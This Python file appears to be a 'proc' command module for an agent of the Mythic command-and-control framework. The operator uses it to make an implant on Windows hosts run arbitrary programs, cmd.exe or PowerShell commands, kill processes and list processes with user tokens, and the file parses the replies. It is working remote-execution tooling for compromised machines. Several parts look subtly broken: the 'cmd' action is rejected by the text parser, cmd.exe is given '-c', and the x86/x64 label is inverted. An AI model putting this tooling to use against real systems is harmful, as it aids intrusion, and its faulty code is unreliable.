from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
from collections import OrderedDict
import json

from .Utils.u import *

class ProcArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="action",
                cli_name="action",
                type=ParameterType.ChooseOne,
                description="Action to perform",
                choices=["run", "pwsh", "cmd", "kill", "list"],
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True,
                        group_name="Default",
                        ui_position=1
                    )
                ]
            ),
            CommandParameter(
                name="command",
                cli_name="command",
                type=ParameterType.String,
                description="Command to execute (for run/pwsh actions)",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False,
                        group_name="Default",
                        ui_position=2
                    )
                ]
            ),
            CommandParameter(
                name="pid",
                cli_name="pid",
                type=ParameterType.Number,
                description="Process ID to kill",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False,
                        group_name="Default",
                        ui_position=2
                    )
                ]
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise ValueError("Must supply arguments")
        
        if self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
            return
            
        # Split while preserving quoted strings
        parts = []
        current = ""
        in_quote = False
        for char in self.command_line:
            if char == '"':
                in_quote = not in_quote
            elif char == ' ' and not in_quote:
                if current:
                    parts.append(current)
                    current = ""
                continue
            current += char
        if current:
            parts.append(current)
        
        if not parts:
            raise ValueError("Must specify an action")
            
        action = parts[0].lower()
        if action not in ["run", "pwsh", "kill", "list"]:
            raise ValueError(f"Invalid action: {action}")
        self.add_arg("action", action)
        
        parts = parts[1:]
        
        if action == "list":
            if parts:
                raise ValueError("list action takes no arguments")
            return
                
        elif action in ["run", "pwsh"]:
            command = None
            
            # Check for explicit -command flag
            for i, part in enumerate(parts):
                if part == "-command" and i < len(parts)-1:
                    command = parts[i+1].strip('"')
                    break
            
            # If no flag, take the rest as command
            if command is None and parts:
                command = " ".join(parts).strip('"')
                
            if not command:
                raise ValueError(f"{action} requires a command parameter")
                
            self.add_arg("command", command)
            
        elif action == "kill":
            pid = None
            
            # Check for explicit -pid flag
            for i, part in enumerate(parts):
                if part == "-pid" and i < len(parts)-1:
                    try:
                        pid = int(parts[i+1])
                    except ValueError:
                        raise ValueError("PID must be a number")
                    break
            
            # If no flag, take the first arg as pid
            if pid is None and parts:
                try:
                    pid = int(parts[0])
                except ValueError:
                    raise ValueError("PID must be a number")
                
            if pid is None:
                raise ValueError("kill requires a pid parameter")
                
            self.add_arg("pid", pid)

    async def parse_dictionary(self, dictionary):
        self.load_args_from_dictionary(dictionary)
        
        action = dictionary.get("action")
        if not action:
            raise ValueError("Action parameter is required")
            
        action = action.lower()
        if action not in ["run", "pwsh", "cmd", "kill", "list"]:
            raise ValueError(f"Invalid action: {action}")
        
        # Validate parameters based on action
        if action == "list":
            if any(k for k in dictionary.keys() if k not in ["action", "task_id"]):
                raise ValueError("list action takes no additional parameters")
                
        elif action in ["run", "pwsh", "cmd"]:
            if not dictionary.get("command"):
                raise ValueError(f"{action} requires a command parameter")
                
        elif action == "kill":
            if not dictionary.get("pid"):
                raise ValueError("kill requires a pid parameter")

class ProcCommand(CommandBase):
    cmd         = "proc"
    needs_admin = False
    help_cmd    = \
    """
    Process Management Utility

    Usage:
    proc -action <action> [parameters]

    Actions and Parameters:
        run  -command <command>  - Run a process
        cmd  -command <command>  - Run command using cmd.exe
        pwsh -command <command>  - Run command using powershell.exe
        kill -pid <pid>          - Kill process by ID
        list                     - List running processes

    Examples:
        proc -action cmd -command "dir"
        proc -action run -command "notepad.exe"
        proc -action pwsh -command "Get-Process | Where-Object { $_.CPU -gt 100 }"
        proc -action kill -pid 1234
        proc -action list
    """
    description = "Process management utility with subcommands for running, listing, and killing processes";
    version     = 1;
    author      = "@Oblivion";
    attackmapping = ["T1059", "T1059.001", "T1059.003", "T1106", "T1057"];
    argument_class = ProcArguments
    browser_script = BrowserScript( script_name="ps_new", author="@Oblivion", for_new_ui=True );
    attributes = CommandAttributes(
        supported_os      = [SupportedOS.Windows],
        suggested_command = True,
        load_only         = False,
        builtin           = True
    );

    async def create_go_tasking(self, task: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        action = task.args.get_arg("action").lower()
        display_params = f"-action {action}"
        
        if action == "list":
            pass  # No additional parameters
            
        elif action in ["run", "pwsh", "cmd"]:
            command = task.args.get_arg("command")
            if not command:
                raise ValueError(f"{action} requires a command parameter")
                
            display_params += f" -command \"{command}\""
            
            if action == "pwsh":
                task.args.add_arg("command", f"powershell.exe -c {command}")
            elif action == "cmd":
                task.args.add_arg("command", f"cmd.exe -c {command}")
            elif action == "run":
                task.args.add_arg("command", command)
                
        elif action == "kill":
            pid = task.args.get_arg("pid")
            if pid is None:
                raise ValueError("kill requires a pid parameter")
            display_params += f" -pid {pid}"
            task.args.add_arg("pid", pid)
        
        return PTTaskCreateTaskingMessageResponse(
            TaskID=task.Task.ID,
            Success=True,
            DisplayParams=display_params,
        )

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        try:
            if not response:
                return PTTaskProcessResponseMessageResponse(
                    TaskID=task.Task.ID,
                    Success=True
                )
                
            RawResponse = bytes.fromhex(response)
            Psr = Parser(RawResponse, len(RawResponse))
            process_list = []

            sub_id = int.from_bytes(Psr.Pad(1), byteorder="big")

            if sub_id == SB_PS_LIST:
                try:
                    while Psr.buffer and len(Psr.buffer) > 0:
                        process_info = {}
                        try:
                            ImagePath = Psr.Wstr()
                            ImageName = ImagePath.split("\\")[-1] if ImagePath else "Unknown"
                            ProcessID = Psr.Int32()
                            ParentID  = Psr.Int32()
                            HandleCnt = Psr.Int32()
                            SessionID = Psr.Int32()
                            ThreadNbr = Psr.Int32()
                            TokenUser = Psr.Str()
                            Isx64     = Psr.Int32()

                            process_info = {
                                "Image Name": ImageName,
                                "Image Path": ImagePath,
                                "Process ID": ProcessID,
                                "Parent ID": ParentID,
                                "Handle Count": HandleCnt,
                                "Session ID": SessionID,
                                "User Token": TokenUser,
                                "Threads Quantity": ThreadNbr,
                                "Architecture": "x86" if Isx64 else "x64"
                            }
                            process_list.append(process_info)
                        except Exception as e:
                            print(f"Error parsing process: {str(e)}")
                            continue

                except Exception as parse_err:
                    raise ValueError(f"Error parsing process list: {str(parse_err)}")

                await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                    TaskID=task.Task.ID,
                    Response=json.dumps(process_list, indent=2, ensure_ascii=False).encode('utf-8')
                ))
            else:
                RawData = Psr.Str();
                Output  = f"[+] Received [{len(RawData)} bytes] from agent\n\n" + RawData;
                await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                    TaskID=task.Task.ID,
                    Response=Output
                ))

            return PTTaskProcessResponseMessageResponse(
                TaskID=task.Task.ID,
                Success=True
            )

        except Exception as e:
            error_msg = f"Error processing response: {str(e)}"
            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                TaskID=task.Task.ID,
                Response=error_msg.encode('utf-8')
            ))
            return PTTaskProcessResponseMessageResponse(
                TaskID=task.Task.ID,
                Success=False,
                Error=error_msg
            )